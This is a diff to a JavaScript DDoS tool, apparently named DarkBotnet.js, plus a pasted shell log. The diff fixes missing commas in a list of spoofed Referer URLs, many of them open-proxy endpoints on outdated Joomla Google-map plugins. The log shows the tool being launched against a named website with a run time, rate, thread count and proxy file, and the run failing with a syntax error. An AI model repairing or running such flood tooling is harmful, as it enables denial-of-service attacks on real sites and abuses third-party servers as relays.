@@ -512,8 +512,8 @@ const refers = [
     'http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=',
     'http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
-    'http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url='
-    'http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url='
+    'http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=',
+    'http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS',
@@ -564,22 +564,22 @@ const refers = [
       'http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=',
       'http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=',
       'http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=',
-        "http://validator.w3.org/feed/check.cgi?url="
-        "http://www.pagescoring.com/website-speed-test/?url="
-        "http://check-host.net/check-http?host="
-        "http://checksite.us/?url="
-        "http://jobs.bloomberg.com/search?q="
-        "http://www.bing.com/search?q="
-        "https://www.yandex.com/yandsearch?text="
-        "http://www.google.com/?q="
-        "https://add.my.yahoo.com/rss?url="
-        "http://www.bestbuytheater.com/events/search?q="
-        "http://www.shodanhq.com/search?q="
-        "https://play.google.com/store/search?q="
-        "http://coccoc.com/search#query="
-        "http://www.search.com/search?q="
-        "https://add.my.yahoo.com/rss?url="
-        "https://images2-focus-opensocial.googleusercontent.com/gadgets/proxy?container=focus&url="
+        "http://validator.w3.org/feed/check.cgi?url=",
+        "http://www.pagescoring.com/website-speed-test/?url=",
+        "http://check-host.net/check-http?host=",
+        "http://checksite.us/?url=",
+        "http://jobs.bloomberg.com/search?q=",
+        "http://www.bing.com/search?q=",
+        "https://www.yandex.com/yandsearch?text=",
+        "http://www.google.com/?q=",
+        "https://add.my.yahoo.com/rss?url=",
+        "http://www.bestbuytheater.com/events/search?q=",
+        "http://www.shodanhq.com/search?q=",
+        "https://play.google.com/store/search?q=",
+        "http://coccoc.com/search#query=",
+        "http://www.search.com/search?q=",
+        "https://add.my.yahoo.com/rss?url=",
+        "https://images2-focus-opensocial.googleusercontent.com/gadgets/proxy?container=focus&url=",
         "https://www.facebook.com/l.php?u=",
         "https://www.facebook.com/l.php?u=",
         "https://drive.google.com/viewerng/viewer?url=",
@@ -2688,3 +2688,20 @@ headers["Referer"] = randomReferer;
  }
 
 
+g2a20jul2@cloudshell:~/V2$ node DarkBotnet.js https://file.cunhua.today 1200 32 10 proxy.txt
+/home/g2a20jul2/V2/DarkBotnet.js:516
+    'http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url='
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+SyntaxError: Unexpected string
+    at internalCompileFunction (node:internal/vm:73:18)
+    at wrapSafe (node:internal/modules/cjs/loader:1153:20)
+    at Module._compile (node:internal/modules/cjs/loader:1205:27)
+    at Module._extensions..js (node:internal/modules/cjs/loader:1295:10)
+    at Module.load (node:internal/modules/cjs/loader:1091:32)
+    at Module._load (node:internal/modules/cjs/loader:938:12)
+    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:83:12)
+    at node:internal/main/run_main_module:23:47
+
+Node.js v20.9.0
+g2a20jul2@cloudshell:~/V2$ 
